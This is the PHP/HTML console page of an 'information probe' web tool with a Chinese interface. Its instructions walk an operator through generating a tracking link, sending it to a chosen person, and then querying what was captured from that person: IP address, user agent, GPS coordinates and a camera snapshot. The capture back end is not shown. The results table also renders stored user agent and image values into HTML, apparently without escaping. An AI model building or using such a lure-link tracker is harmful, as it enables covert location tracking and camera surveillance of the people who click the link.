<?php require_once '../../include/front/header.php'; ?>
        
        <div class="layui-card">
            <div class="layui-card-header">说明</div>
            <div class="layui-card-body">
                1.首先,输入一个密钥,将类型改为生成,点击操作生成一个记录网址.<br/>
                2.发送给你需要查看的人,让他点击网址(会有权限提示).<br/>
                3.等到他点击完之后,将类型改为查询,输入密钥,点击操作查询记录.<br/>
                4.如需删除将类型改为删除,输入密钥,点击操作即可.
            </div>
        </div>
        
        <div class="layui-card">
            <div class="layui-card-header">控制台</div>
            <div class="layui-card-body">
                
                <form class="layui-form layui-form-pane">
                    
                    <div class="layui-form-item">
                        <label class="layui-form-label">类型</label>
                        <div class="layui-input-block">
                            <select name="type" lay-verify="required">
                                <option value="generate" selected="">生成</option>
                                <option value="query">查询</option>
                                <option value="delete">删除</option>
                          </select>
                        </div>
                    </div>
                    
                    <div class="layui-form-item">
                        <label class="layui-form-label">密钥</label>
                        <div class="layui-input-block">
                            <input type="text" name="key" onKeyUp="value=value.replace(/[\W]/g,'')" autocomplete="off" placeholder="请输入密钥" class="layui-input" lay-verify="required"/>
                        </div>
                    </div>
                    
                    <div class="layui-form-item">
                        <div class="layui-input-block">
                            <button type="submit" id="submit_button" class="layui-btn" lay-submit="" lay-filter="submit_button">提交</button>
                        </div>
                    </div>
                    
                </form>
                
            </div>
        </div>
        
        <div id="result" style="display: none;" class="layui-card">
            <div class="layui-card-header">结果</div>
            <div class="layui-card-body">
                <table class="layui-hide" id="result_table"></table>
            </div>
        </div>
        
        <style type="text/css">
            .layui-table-cell{
                text-align: center;
                height: auto;
                white-space: normal;
            }
            .layui-table img{
                max-width: 200px
            }
        </style>
        
        <script type="text/javascript">
            layui.use(['form'], function() {
                var form = layui.form;
                
                form.on('submit(submit_button)', function(data) {
                    data = data.field;
                    
                    var load = layer.load(0, {shade: false}),
                        submit_button = document.getElementById('submit_button'),
                        type = data.type,
                        key = data.key,
                        url = '<?php echo ROOT_PATH; ?>/include/back/tool_api/information_probe.php?',
                        result = document.getElementById("result");
                    
                    submit_button.disabled = true;
                    result.style.display = 'none';
                    
                    <?php
                        if ($verification['open']) {
                            echo '
                                if (!is_verification_success()) {
                                    layer.close(load);
                                    layer.msg("验证未登录");
                                    submit_button.disabled = false;
                                    return false;
                                }
                            ';
                        }
                    ?>
                    
                    if(!type || !key){
                        layer.close(load);
                        layer.msg('请填写完整信息');
                        submit_button.disabled = false;
                    } else {
                        if (type == 'generate') {
                            axios.get(url + 'type=query&key=' + key)
                                .then(function(data) {
                                    var information = window.location.protocol + '//' + window.location.host + '/include/back/tool_api/information_probe.php?type=record&key=' + key;
                                    
                                    data = data.data.information;
                                    layer.close(load);
                                    if (typeof data == 'object') {
                                        layer.confirm('密钥已存在,是否继续使用?', {
                                            btn: ['确认', '取消']
                                        }, function() {
                                            layer.open({
                                                content: '探针网址:' + information
                                                ,btn: ['复制', '取消']
                                                ,yes: function(index, layero){
                                                    copy_text(information);
                                                    layer.msg('复制成功');
                                                }
                                            });
                                        });
                                    } else {
                                        layer.open({
                                            content: '探针网址:' + information
                                            ,btn: ['复制', '取消']
                                            ,yes: function(index, layero){
                                                copy_text(information);
                                                layer.msg('复制成功');
                                            }
                                        });
                                    }
                                    submit_button.disabled = false;
                            });
                        } else if (type == 'query') {
                            axios.get(url + 'type=query&key=' + key)
                                .then(function(data) {
                                    var record_data = [];
                                    
                                    data = data.data.information;
                                    if (typeof data == 'object') {
                                        for (let data_count in data) {
                                            record_data.push({
                                                'ip': data_count,
                                                'user_agent': data[data_count].user_agent,
                                                'gps': data[data_count].gps,
                                                'camera': data[data_count].camera
                                            });
                                        }
                                        
                                        layui.use('table', function() {
                                            var table = layui.table;
                                            
                                            table.render({
                                                elem: '#result_table'
                                                ,cols: [[
                                                    {field: 'ip', title: 'IP', width: 200, templet: '<div><a href="../../tool/development/ip_location.php?ip={{ d.ip }}" target="_blank">{{ d.ip }}</a></div>'}
                                                    ,{field: 'user_agent', title: 'UA', width: 300, templet: '<div><a href="../../tool/development/user_agent_analysis.php?user_agent={{ d.user_agent }}" target="_blank">{{ d.user_agent }}</a></div>'}
                                                    ,{field: 'gps', title: '经纬度', width: 250}
                                                    ,{field: 'camera', title: '摄像头', width: 340, templet: '<div><img src="{{ d.camera }}"></div>'}
                                                ]]
                                                ,data: record_data
                                            });
                                        });
                                        
                                        layer.close(load);
                                        result.style.display = "block";
                                        submit_button.disabled = false;
                                    } else {
                                        layer.close(load);
                                        layer.msg('无记录');
                                        submit_button.disabled = false;
                                    }
                            });
                        } else {
                            axios.get(url + 'type=delete&key=' + key)
                                .then(function(data) {
                                    data = data.data.information;
                                    layer.close(load);
                                    layer.msg(data);
                                    submit_button.disabled = false;
                            });
                        }
                    }
                    
                    return false;
                });
            });
        </script>
        
<?php require_once '../../include/front/footer.php'; ?>